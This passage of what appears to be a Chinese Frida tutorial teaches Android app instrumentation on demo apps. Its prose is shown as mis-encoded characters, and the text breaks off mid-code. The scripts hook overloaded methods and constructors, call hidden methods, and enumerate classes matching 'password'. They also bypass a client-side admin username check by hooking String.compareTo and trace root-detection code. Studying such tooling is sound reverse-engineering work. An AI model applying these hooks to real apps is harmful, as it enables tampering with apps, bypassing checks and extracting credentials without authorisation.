oacia-sum: 15004-05 20:16:28.425 27285 27285 D oacia-sum: 150*/# å‡½æ•°é‡è½½æ—¶çš„ hook, æœªä½¿ç”¨çš„å‡½æ•°çš„è°ƒç”¨ # source code package com.roysue.demo02;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private String total = \"@@@###@@@\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; fun(50,30); Log.d(\"ROYSUE.string\" , fun(\"LoWeRcAsE Me!!!!!!!!!\")); &#125; &#125; void fun(int x , int y )&#123; Log.d(\"ROYSUE.Sum\" , String.valueOf(x+y)); &#125; String fun(String x)&#123; total +=x; return x.toLowerCase(); &#125; String secret()&#123; return total; &#125;&#125;# frida code å‡½æ•°é‡è½½ æˆ‘ä»¬ä½¿ç”¨åŸæ¥çš„ä»£ç è¯•ä¸€è¯•æœ‰é‡è½½çš„å‡½æ•° function hook()&#123; Java.perform(function()&#123; var activity = Java.use(\"com.roysue.demo02.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"log successfully\"); &#125; &#125;)&#125;setImmediate(hook,0);è¿™é‡Œå°†ä¼šæŠ¥é”™ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿéœ€è¦ç»å†æŠ¥é”™çš„è¿‡ç¨‹æ‰çŸ¥é“æˆ‘ä»¬éœ€è¦åŠ ä¸Šçš„æ˜¯å“ªä¸€ä¸ªé‡è½½ç±»å‹ (æ¯•ç«Ÿç°åœ¨æ„Ÿè§‰ java çš„ç±»å‹è¿˜æ˜¯æ¯”è¾ƒéš¾è®°çš„ï¼Œä¸å¦‚ç›´æ¥é€šè¿‡æŠ¥é”™æ¥ç›´æ¥å¤åˆ¶ç²˜è´´é‡è½½å‡½æ•°å‚æ•°çš„ç±»å‹æ–¹ä¾¿), æç¤ºå‡½æ•°æœ‰é‡è½½ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ ¹æ®æç¤ºï¼ŒåŠ ä¸Šé‡è½½ .overload('java.lang.String') å³å¯ /** * * [SM-P200::com.roysue.demo02 ]-> Error: fun(): has more than one overload, use .overload(&lt;signature>) to choose from: .overload('java.lang.String') .overload('int', 'int') at X (frida/node_modules/frida-java-bridge/lib/class-factory.js:568) at K (frida/node_modules/frida-java-bridge/lib/class-factory.js:563) at set (frida/node_modules/frida-java-bridge/lib/class-factory.js:931) at &lt;anonymous> (D:\\frida\\AndroidSecurityStudy-master\\FRIDA\\A02\\02\\hook.js:3) at &lt;anonymous> (frida/node_modules/frida-java-bridge/lib/vm.js:12) at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250) at &lt;anonymous> (frida/node_modules/frida-java-bridge/index.js:242) at apply (native) at ne (frida/node_modules/frida-java-bridge/lib/class-factory.js:619) at &lt;anonymous> (frida/node_modules/frida-java-bridge/lib/class-factory.js:597)Process terminated */ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ //overload çš„ä½¿ç”¨function hook1()&#123; Java.perform(function()&#123; var activity = Java.use(\"com.roysue.demo02.MainActivity\"); activity.fun.overload('java.lang.String').implementation = function(x)&#123; console.log(\"oacia find the real func,the arg type is java.lang.String!\"); var String_class = Java.use('java.lang.String'); var myStr = String_class.$new(\"oaciA ChaNge yOu!\");//new ä¸€ä¸ªå­—ç¬¦ä¸² var retv = this.fun(myStr); console.log(\"oacia change you,now it return \"+\"\\\"\" +retv +\"\\\"\"); return retv; &#125; &#125;)&#125;//setImmediate(hook1,0);/**cmd[SM-P200::com.roysue.demo02 ]-> oacia find the real func,the arg type is java.lang.String!oacia change you,now it return \"oacia change you!\" *//**logcat04-05 20:31:37.879 28305 28305 D ROYSUE.Sum: 8004-05 20:31:37.879 28305 28305 D ROYSUE.string: lowercase me!!!!!!!!!04-05 20:40:25.458 28514 28514 D ROYSUE.Sum: 8004-05 20:40:25.470 28514 28514 D ROYSUE.string: oacia change you! */ æœªä½¿ç”¨çš„å‡½æ•°çš„è°ƒç”¨ // è°ƒç”¨æœªä½¿ç”¨çš„å‡½æ•°function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);/**cmdSpawned `com.roysue.demo02`. Resuming main thread![SM-P200::com.roysue.demo02 ]-> find instance: com.roysue.demo02.MainActivity@7cdb8ddoacia find the secret function and the result is @@@###@@@LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!LoWeRcAsE Me!!!!!!!!!choose end~~ */å‡å¦‚ä¸€å¼€å§‹å°±ä½¿ç”¨ java.choose , é‚£ä¹ˆå°†æ•è·ä¸åˆ°ç±»ï¼Œå› ä¸ºæ­¤æ—¶è¦æ•è·çš„ç±»è¿˜æ²¡æœ‰åŠ è½½æ‰€ä»¥è¿™é‡Œä½¿ç”¨ setTimeout (éé˜»å¡æ–¹å¼) æ¥å»¶è¿Ÿ 5s æ•è·ï¼Œ com.roysue.demo02.MainActivity æ­¤æ—¶ç±»å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­æ‰€ä»¥å°†ä¼šæœ‰å›æ˜¾ï¼Œå¦‚æœä»ç„¶ä½¿ç”¨ setImmediate(hook3,0); , é‚£ä¹ˆæ•è·ä¸åˆ°ç±»æ˜¯å¿…ç„¶çš„ï¼š) æ›´å¤šæœ‰å…³å»¶è¿Ÿæ•è·å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç«  # å‡½æ•°çš„è¿œç¨‹è°ƒç”¨ å½“æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬ç‰¹åˆ«æƒ³è¦è°ƒç”¨ä¸€ä¸ª apk ä¸­çš„æŸä¸ªå‡½æ•°ï¼Œè€Œä¸”ä¸æ­¢ä¸€æ¬¡æ—¶ï¼Œå°±æ˜¯è¿™ä¸ªåŠŸèƒ½ â€” å‡½æ•°çš„è¿œç¨‹è°ƒç”¨èµ·ä½œç”¨çš„æ—¶å€™äº† åœ¨ r0ysue å¤§ä½¬å†™åˆ°æ­¤å¤„ä¸­çº§èƒ½åŠ›ï¼šè¿œç¨‹è°ƒç”¨æ—¶ï¼Œç”¨çš„æ˜¯ python è„šæœ¬æ¥ä½œä¸º js çš„æ‰§è¡Œè„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä¸å¤ªå–œæ¬¢ python éœ€è¦æå‰å†™é‚£ä¹ˆå¤šæ¨¡æ¿ä»£ç ï¼Œè€Œæ›´å–œæ¬¢ frida ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œæ¥å°† js è„šæœ¬æ³¨å…¥ apk ä¸­ï¼ŒåŒæ—¶é€šè¿‡æŸ¥é˜…èµ„æ–™æˆ‘çœ‹åˆ°ä¸€ä¸ªè¯„è®º æ‰€ä»¥æˆ‘ä¹Ÿå†³å®šä½¿ç”¨è¿™ç§æ–¹å¼æ¥è¿›è¡Œå‡½æ•°çš„è¿œç¨‹è°ƒç”¨ï¼Œæ¥ä¸‹æ¥å°±è¯•ä¸€è¯•èƒ½ä¸èƒ½è¡Œå¾—é€šå§ åœ¨ä¸Šä¸€ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æˆåŠŸè°ƒç”¨äº†æœªä½¿ç”¨çš„å‡½æ•° secret() , ç¨å¾®ç½‘ä¸Šç¿»ä¸€ç¿»å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å®ç°è¿™ä¸ªåŠŸèƒ½çš„ä»£ç ä¸º function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);è€Œæˆ‘ä»¬å‡å¦‚éœ€è¦å¤šæ¬¡è°ƒç”¨ secret() é‚£ä¹ˆå°±éœ€è¦å¯¹ä¸Šé¢çš„ js ä»£ç è¿›è¡Œéƒ¨åˆ†ä¿®æ”¹ function hook3()&#123; Java.perform(function()&#123; Java.choose(\"com.roysue.demo02.MainActivity\",&#123; onMatch: function(instance)&#123; console.log(\"find instance: \",instance); console.log(\"oacia find the secret function and the result is \",instance.secret()); &#125;, onComplete: function()&#123; console.log(\"choose end~~\"); &#125; &#125;) &#125;)&#125;rpc.exports = &#123; HOOK3: hook3// å°†å‡½æ•° hook3 å¯¼å‡ºä¸º HOOK3 æ¥è¿›è¡Œè°ƒç”¨ï¼Œè°ƒç”¨æ–¹å¼: rpc.exports.HOOK3 ()&#125;;/*setImmediate(function()&#123; setTimeout(hook3, 5000);&#125;,0);*/çœ‹çœ‹è¾“å‡ºï½ æˆåŠŸå®ç°ï¼ï¼ï¼ # äº’è”äº’é€šã€åŠ¨æ€ä¿®æ”¹ # source code package com.roysue.demo04;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.util.Base64;import android.view.View;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; EditText username_et; EditText password_et; TextView message_tv; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); password_et = (EditText) this.findViewById(R.id.editText2); username_et = (EditText) this.findViewById(R.id.editText); message_tv = ((TextView) findViewById(R.id.textView)); this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; if (username_et.getText().toString().compareTo(\"admin\") == 0) &#123; message_tv.setText(\"You cannot login as admin\"); return; &#125; //hook target message_tv.setText(\"Sending to the server :\" + Base64.encodeToString((username_et.getText().toString() + \":\" + password_et.getText().toString()).getBytes(), Base64.DEFAULT)); &#125; &#125;); &#125;&#125;# [TODO] ç®€è¦åˆ†æè¯¥ apk åœ¨è¿™ä¸ª apk ä¸­ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ admin, é‚£ä¹ˆç¨‹åºå°†ä¼šè¿”å› You cannot login as admin è¿™æ˜¯å› ä¸ºåœ¨ apk ä¸­æœ‰å¯¹ç”¨æˆ·åçš„æ ¡éªŒï¼Œå¦‚æœç”¨æˆ·åä¸º admin é‚£ä¹ˆè¯¥ apk å°†ä¸ä¼šæŠŠè¿™ä¸ª http è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ (å‡è£…æœ‰ä¸ªæœåŠ¡å™¨.png) æ¥ä¸‹æ¥æˆ‘ä»¬å°†è¦å®ç°çš„æ˜¯ï¼šå½“æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åä¸º admin , å¯†ç ä¸º 123456 æ—¶ï¼Œå¯ä»¥é€šè¿‡ admin è¿™ä¸ªç”¨æˆ·åæ¥å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè€Œä¸ä¼šè¢«ç¨‹åºçš„æ£€æµ‹åŠŸèƒ½æ‹¦æˆª è¿™é‡Œæœ‰ä¸¤ç§å®ç°æ€è·¯: ç¬¬ä¸€ç§ï¼Œç»•è¿‡ç¨‹åºå¯¹äº admin çš„æ£€æµ‹ æˆ‘ä»¬é€šè¿‡ä½¿ç”¨ jadx å¯¹è¿™ä¸ª apk è¿›è¡Œåç¼–è¯‘ï¼Œå¯ä»¥å‘ç°æ­¤å¤„çš„ä»£ç çš„ä½œç”¨æ˜¯å¯¹ç”¨æˆ·åæ˜¯å¦ä¸º admin è¿›è¡Œæ ¡éªŒ é‚£ä¹ˆæˆ‘ä»¬åªè¦ä½¿ç”¨ frida è®© compareTo å‡½æ•°æ°¸è¿œè¿”å› true ä¸å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æµ‹äº†å— frida ä»£ç å¦‚ä¸‹ function hook()&#123; Java.perform(function()&#123; var string_class = Java.use(\"java.lang.String\"); string_class.compareTo.overload('java.lang.String').implementation = function(x)&#123; if(x===\"admin\")&#123; console.log(\"find compareTo !!! argv is \",x); return 1; &#125; return this.compareTo(x); &#125; &#125;)&#125;setImmediate(function()&#123; setTimeout(hook, 5000);// è¿™é‡Œç»è¿‡å°è¯•ï¼Œå¦‚æœä¸å»¶è¿Ÿäº”ç§’å† hook çš„è¯ï¼Œé‚£ä¹ˆ frida å°†ä¼šè‡ªåŠ¨é€€å‡º (åŸå› è¿˜ä¸æ¸…æ¥š)&#125;,0) [TODO] ç¬¬äºŒç§æ€è·¯å°±æ˜¯åœ¨å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯å‰ï¼Œå°†æˆ‘ä»¬çš„ç”¨æˆ·åæ›¿æ¢ä¸º admin æ¯”å¦‚æˆ‘ä¸€å¼€å§‹è¾“å…¥çš„ç”¨æˆ·åä¸º oacia , é‚£ä¹ˆè¿™è‚¯å®šæ˜¯å¯ä»¥è¿‡ç¨‹åºå¯¹äºç”¨æˆ·åæ˜¯å¦ä¸º admin çš„æ ¡éªŒçš„ï¼Œå®é™…ä¸Šï¼Œæˆ‘ä»¬ hook çš„ä»£ç åº”è¯¥æ˜¯åœ¨æ­¤å¤„çš„ æˆ‘ä»¬å°±å‡è£… textView.setText(sb.toString()); è¿™è¡Œä»£ç å°±æ˜¯å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯çš„ä»£ç ï¼š) æ‰€ä»¥æˆ‘ä»¬å°†ä¼šç”¨ frida æ¥åšä»€ä¹ˆå‘¢ï¼Ÿæ²¡é”™ï¼Œæˆ‘ä»¬å°†è¦ä¿®æ”¹ sb è¿™ä¸ªå˜é‡ # hook æŸä¸ªç±»çš„æ„é€ å‡½æ•° # source code User ç±» package com.oacia.inithook;public class User &#123; public int age; public String name; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code å¯¹äºæ„é€ å‡½æ•°çš„ hook, æˆ‘ä»¬éœ€è¦ä½¿ç”¨ $init è¿™ä¸ªå…³é”®è¯æ¥è¿›è¡Œ hook function hook()&#123; if(Java.available)&#123; Java.perform(function()&#123; console.log(\"start hook~\"); const User = Java.use(\"com.oacia.inithook.User\"); if(User != undefined)&#123; User.$init.overload('java.lang.String', 'int').implementation = function(name,age)&#123; console.log(\"hook constructor,overload('java.lang.String', 'int')!!!\"); console.log(\"name = \",name,\", age = \",age); return this.$init(name,age); &#125; User.$init.overload().implementation = function()&#123; console.log(\"hook constructor,overload()!!!\"); &#125; console.log(\"hook end~\"); &#125; &#125;) &#125;&#125;setImmediate(hook,0);# ä¸»åŠ¨è°ƒç”¨ä¸€ä¸ªç±» # source code package com.oacia.inithook;public class User &#123; public int age; public String name; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code å½“æˆ‘ä»¬æƒ³è¦ä¸»åŠ¨å»è°ƒç”¨ä¸€ä¸ªç±»æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ $new å…³é”®å­—æ¥æ–°å»ºä¸€ä¸ªå®ä¾‹ function hook()&#123; Java.perform(function()&#123; var User = Java.use(\"com.oacia.inithook.User\"); var me = User.$new(\"ooooacia\",999); var info = me.toString(); console.log(info); console.log(\"change info ing...\"); me.name.value = \"oaciaaaa\"; me.age.value = 20; info = me.toString(); console.log(info) &#125;)&#125;setImmediate(hook,0);# hook å†…éƒ¨ç±» # source code package com.oacia.inithook;public class User &#123; public int age; public String name; class signin&#123; private String uid; private String passwd; public signin(String uid_,String passwd_)&#123; this.uid = uid_; this.passwd = passwd_; &#125; public String toString()&#123; StringBuilder sb = new StringBuilder(); sb.append(\"signin&#123;uid=\"); sb.append(this.uid); sb.append(\", passwd=\"); sb.append(this.passwd); return sb.toString(); &#125; &#125; public String toString() &#123; StringBuilder sb = new StringBuilder(); sb.append(\"User&#123;name='\"); sb.append(this.name); sb.append('\\''); sb.append(\", age=\"); sb.append(this.age); sb.append('&#125;'); return sb.toString(); &#125; public User(String name2, int age2) &#123; this.name = name2; this.age = age2; &#125; public User() &#123; this.name = \"oacia\"; this.age = 20; &#125;&#125;# frida code åœ¨æ­¤å¤„ç»™å‡ºçš„ source code ä¸­ï¼Œå†…éƒ¨ç±»çš„åç§°ä¸º signin , å¦‚æœæˆ‘ä»¬æƒ³è¦å» hook å†…éƒ¨ç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨å¦‚ä¸‹çš„è¯­æ³•æ¥è¿›è¡Œ hook com.oacia.inithook.User$signin function hook_inner()&#123; Java.perform(function()&#123; var signin = Java.use(\"com.oacia.inithook.User$signin\"); signin.toString.implementation = function()&#123; console.log(\"æˆåŠŸhookå†…éƒ¨ç±»signinä¸­çš„toStringå‡½æ•°!!\"); var ret = this.toString(); console.log(\"return value: \",ret); return ret; &#125; &#125;)&#125;setImmediate(hook_inner,0);# frida å¸¸ç”¨è„šæœ¬ # Java å±‚ # hook java ä¸­ä¸€ä¸ªç±»çš„å‡½æ•°å¹¶ä¿®æ”¹å‚æ•° function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.oacia.frida_a02_01_demo2.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \" + x + \",y = \" + y); const retv = this.fun(60,90); return retv; &#125; &#125;)&#125;setImmediate(hook,0);# enum class/method &amp;&amp; find class //from https://github.com/0xdea/frida-scripts/// enumerate all Java classesfunction enumAllClasses()&#123; var allClasses = []; var classes = Java.enumerateLoadedClassesSync(); classes.forEach(function(aClass) &#123; try &#123; var className = aClass.match(/[L](.*);/)[1].replace(/\\//g, \".\"); &#125; catch(err) &#123;return;&#125; // avoid TypeError: cannot read property 1 of null allClasses.push(className); &#125;); return allClasses;&#125;// find all Java classes that match a patternfunction findClasses(pattern)&#123; var allClasses = enumAllClasses(); var foundClasses = []; allClasses.forEach(function(aClass) &#123; try &#123; if (aClass.match(pattern)) &#123; foundClasses.push(aClass); &#125; &#125; catch(err) &#123;&#125; // avoid TypeError: cannot read property 'match' of undefined &#125;); return foundClasses;&#125;// enumerate all methods declared in a Java classfunction enumMethods(targetClass)&#123; var hook = Java.use(targetClass); var ownMethods = hook.class.getDeclaredMethods(); hook.$dispose; return ownMethods;&#125;/* * The following functions were not implemented because deemed impractical: * * enumAllMethods() - enumerate all methods declared in all Java classes * findMethods(pattern) - find all Java methods that match a pattern * * See raptor_frida_ios_enum.js for a couple of ObjC implementation examples. */// usage examplessetTimeout(function() &#123; // avoid java.lang.ClassNotFoundException Java.perform(function() &#123; // enumerate all classes /* var a = enumAllClasses(); a.forEach(function(s) &#123; console.log(s); &#125;); */ // find classes that match a pattern /* var a = findClasses(/password/i); a.forEach(function(s) &#123; console.log(s); &#125;); */ // enumerate all methods in a class /* var a = enumMethods(\"com.target.app.PasswordManager\") a.forEach(function(s) &#123; console.log(s); &#125;); */ &#125;);&#125;, 0);# trace module/class/method //from https://github.com/0xdea/frida-scripts/// generic tracefunction trace(pattern)&#123; var type = (pattern.toString().indexOf(\"!\") === -1) ? \"java\" : \"module\"; if (type === \"module\") &#123; console.log(\"module\") // trace Module var res = new ApiResolver(\"module\"); var matches = res.enumerateMatchesSync(pattern); var targets = uniqBy(matches, JSON.stringify); targets.forEach(function(target) &#123; try&#123; traceModule(target.address, target.name); &#125; catch(err)&#123;&#125; &#125;); &#125; else if (type === \"java\") &#123; console.log(\"java\") // trace Java Class var found = false; Java.enumerateLoadedClasses(&#123; onMatch: function(aClass) &#123; if (aClass.match(pattern)) &#123; found = true; console.log(\"found is true\") console.log(\"before:\"+aClass) //var className = aClass.match(/[L](.*);/)[1].replace(/\\//g, \".\"); var className = aClass.match(/[L]?(.*);?/)[1].replace(/\\//g, \".\"); console.log(\"after:\"+className) traceClass(className); &#125; &#125;, onComplete: function() &#123;&#125; &#125;); // trace Java Method if (!found) &#123; try &#123; traceMethod(pattern); &#125; catch(err) &#123; // catch non existing classes/methods console.error(err); &#125; &#125; &#125;&#125;// find and trace all methods declared in a Java Classfunction traceClass(targetClass)&#123; console.log(\"entering traceClass\") var hook = Java.use(targetClass); var methods = hook.class.getDeclaredMethods(); hook.$dispose(); console.log(\"entering pasedMethods\") var parsedMethods = []; methods.forEach(function(method) &#123; try&#123; parsedMethods.push(method.toString().replace(targetClass + \".\", \"TOKEN\").match(/\\sTOKEN(.*)\\(/)[1]); &#125; catch(err)&#123;&#125; &#125;); console.log(\"entering traceMethods\") var targets = uniqBy(parsedMethods, JSON.stringify); targets.forEach(function(targetMethod) &#123; try&#123; traceMethod(targetClass + \".\" + targetMethod); &#125; catch(err)&#123;&#125; &#125;);&#125;// trace a specific Java Methodfunction traceMethod(targetClassMethod)&#123; var delim = targetClassMethod.lastIndexOf(\".\"); if (delim === -1) return; var targetClass = targetClassMethod.slice(0, delim) var targetMethod = targetClassMethod.slice(delim + 1, targetClassMethod.length) var hook = Java.use(targetClass); var overloadCount = hook[targetMethod].overloads.length; console.log(\"Tracing \" + targetClassMethod + \" [\" + overloadCount + \" overload(s)]\"); for (var i = 0; i &lt; overloadCount; i++) &#123; hook[targetMethod].overloads[i].implementation = function() &#123; console.warn(\"\\n*** entered \" + targetClassMethod); // print backtrace // Java.perform(function() &#123; // var bt = Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new()); // console.log(\"\\nBacktrace:\\n\" + bt); // &#125;); // print args if (arguments.length) console.log(); for (var j = 0; j &lt; arguments.length; j++) &#123; console.log(\"arg[\" + j + \"]: \" + arguments[j]); &#125; // print retval var retval = this[targetMethod].apply(this, arguments); // rare crash (Frida bug?) console.log(\"\\nretval: \" + retval); console.warn(\"\\n*** exiting \" + targetClassMethod); return retval; &#125; &#125;&#125;// trace Module functionsfunction traceModule(impl, name)&#123; console.log(\"Tracing \" + name); Interceptor.attach(impl, &#123; onEnter: function(args) &#123; // debug only the intended calls this.flag = false; // var filename = Memory.readCString(ptr(args[0])); // if (filename.indexOf(\"XYZ\") === -1 &amp;&amp; filename.indexOf(\"ZYX\") === -1) // exclusion list // if (filename.indexOf(\"my.interesting.file\") !== -1) // inclusion list this.flag = true; if (this.flag) &#123; console.warn(\"\\n*** entered \" + name); // print backtrace console.log(\"\\nBacktrace:\\n\" + Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join(\"\\n\")); &#125; &#125;, onLeave: function(retval) &#123; if (this.flag) &#123; // print retval console.log(\"\\nretval: \" + retval); console.warn(\"\\n*** exiting \" + name); &#125; &#125; &#125;);&#125;// remove duplicates from arrayfunction uniqBy(array, key)&#123; var seen = &#123;&#125;; return array.filter(function(item) &#123; var k = key(item); return seen.hasOwnProperty(k) ? false : (seen[k] = true); &#125;);&#125;// usage examplessetTimeout(function() &#123; // avoid java.lang.ClassNotFoundException Java.perform(function() &#123; // trace(\"com.target.utils.CryptoUtils.decrypt\"); // trace(\"com.target.utils.CryptoUtils\"); // trace(\"CryptoUtils\"); // trace(/crypto/i); // trace(\"exports:*!open*\"); &#125;); &#125;, 0);# æ‰“å°å †æ ˆä¿¡æ¯ å‡è®¾æŸä¸ª app æœ‰æ£€æŸ¥æœºåˆ¶ï¼Œä¼šä¾¦æµ‹æ˜¯ä¸æ˜¯æœ‰ rootï¼Œç„¶ååŸå§‹ç ç»è¿‡æ··æ·†æ‰€ä»¥æ¯”è¾ƒéš¾è¿½è¸ªï¼Œä½†æ˜¯åœ¨æ£€æŸ¥æ—¶ä¼šç”¨ Log.d è¾“å‡ºæ£€æŸ¥ç›¸å…³èµ„è®¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ hook Log.dï¼Œå¹¶ä¸”åˆ©ç”¨ Log.getStackTraceString è¾“å‡º stack traceï¼Œå°±èƒ½çŸ¥é“æ˜¯åœ¨å“ªè¾¹å‘¼å«è¿™ä¸ª function var Log = Java.use(\"android.util.Log\");var Exception = Java.use(\"java.lang.Exception\");Log.d.overload(\"java.lang.String\", \"java.lang.String\").implementation = function (a, b) &#123; // å‘ç°è¾“å‡º root çš„ Log æ—¶ if (b.indexOf('root') >= 0) &#123; // æ‰“å° stack trace æ–¹ä¾¿è¿½è¸ª console.log(Log.getStackTraceString( Exception.$new())); &#125; return this.d.overload(\"java.lang.String\", \"java.lang.String\").call(this, a, b)&#125;;# æ··æ·†æ–¹æ³•åçš„ hook å¦‚æœç±»åå’Œæ–¹æ³•åéƒ½æ˜¯ä¸å¯è§çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆæŠŠè¿™äº›ä¸å¯è§å­—ç¬¦ä»¥ URLç¼–ç  ï¼Œç„¶åç”¨ js çš„å‡½æ•° decodeURIComponent è¿›è¡Œè§£ç  // å‡è®¾æˆ‘ä»¬ URLEncode è¿‡åçš„æ··æ·†æ–¹æ³•åä¸ºï¼š% EE% A0%91ï¼Œç±»åä¸ºï¼š% EE% A0%94% EE% A0%94% EE% A0%94% EE% A0// é‚£æˆ‘ä»¬è¦ Hook è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥åƒä»¥ä¸‹å†™æ³•// å–æ··æ·†ç±»åçš„ç±»var obj = Java.use(decodeURIComponent(\"%EE%A0%94%EE%A0%94%EE%A0%94%EE%A0\"));// é€šè¿‡ obj [] æ–¹å¼æ¥å®šä½åˆ°æ–¹æ³•ï¼Œåœ¨é‡Œé¢é€šè¿‡ decodeURIComponent () è§£ç æˆ‘ä»¬æ··æ·†çš„æ–¹æ³•åobj[decodeURIComponent(\"%EE%A0%91\")].implementation = function()&#123; //do hook // å¦‚æœæˆ‘ä»¬æƒ³è¦è°ƒç”¨è¯¥ç±»å¦å¤–ä¸€ä¸ªæ··æ·†çš„æ–¹æ³• % EE% A0%94% EE% A0%91% EEã€‚é‚£ä¹ˆå¯ä»¥å¦‚ä¸‹æ“ä½œï¼š this[decodeURIComponent(\"%EE%A0%94%EE%A0%91%EE\")](å‚æ•°);&#125;# åˆ©ç”¨ java çš„åå°„æœºåˆ¶æ‰“å°æ–¹æ³• ä»€ä¹ˆæ˜¯ java çš„åå°„æœºåˆ¶ï¼Ÿ åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨ç¼–è¯‘é˜¶æ®µä¸çŸ¥é“æ˜¯å“ªä¸ªç±»è¢«åŠ è½½ï¼Œè€Œæ˜¯åœ¨è¿è¡Œçš„æ—¶å€™æ‰åŠ è½½ã€æ‰§è¡Œã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåå°„æœºåˆ¶æŒ‡çš„æ˜¯ç¨‹åºåœ¨è¿è¡Œæ—¶èƒ½å¤Ÿè·å–è‡ªèº«çš„ä¿¡æ¯ã€‚ js ä¸­çš„ apply å°±æ˜¯åå°„æœºåˆ¶ã€‚ ç±» ParametersTest public class ParametersTest &#123; private final int count = 523;// å­—æ®µ count private final String plainText = \"this is a test\";// å­—æ®µ plainText public int multiply(int val1,int val2)&#123; return val1 * val2; &#125; public byte multiply(byte val1,byte val2)&#123; return (byte)(val1 * val2); &#125; public short multiply(short val1,short val2)&#123; return (short)(val1 * val2); &#125; public long multiply(long val1,long val2)&#123; return val1 * val2; &#125; public float multiply(float val1,float val2)&#123; return val1 * val2; &#125; public double multiply(double val1,double val2)&#123; return val1 * val2; &#125; public String addMethod(String str1,String str2)&#123; return str1 + str2; &#125; public void addMethod(int[] initArray)&#123; for(int i = 0; i &lt; initArray.length;i++)&#123; initArray[i] = initArray[i] + 1; &#125; &#125; public void addMethod(byte[] byteArray)&#123; for(int i = 0; i &lt; byteArray.length;i++)&#123; byteArray[i] = (byte)(byteArray[i] + 1); &#125; &#125; public void addMethod(long[] longArray)&#123; for(int i = 0; i &lt; longArray.length; i++)&#123; longArray[i] = longArray[i] + 1; &#125; &#125; public void addMethod(float[] floatArray)&#123; for(int i = 0; i &lt; floatArray.length; i++)&#123; floatArray[i] = floatArray[i] + 1; &#125; &#125; public void addMethod(double[] doubleArray)&#123; for(int i = 0; i &lt; doubleArray.length; i++)&#123; doubleArray[i] = doubleArray[i] + 1; &#125; &#125; public void addMethod(String[] strArray)&#123; String result = \"\"; for(int i = 0; i &lt; strArray.length; i++)&#123; result = result + strArray[i]; &#125; &#125; //display æ–¹æ³•å‚æ•°ä¸º ParametersTest å¯¹è±¡ public void display(ParametersTest parametersTest)&#123; int[] intArray = &#123;1,2,3,4,5&#125;; parametersTest.addMethod(intArray); byte[] byteArray = &#123;0x10,0x11,0x12,0x13&#125;; parametersTest.addMethod(byteArray); long[] longArray = &#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(longArray); String[] strArray = &#123;\"abcde\",\"1222CDedd\",\"12daer\",\"cder\"&#125;; parametersTest.addMethod(strArray); float[] floatArray = &#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(floatArray); double[] doubleArray = 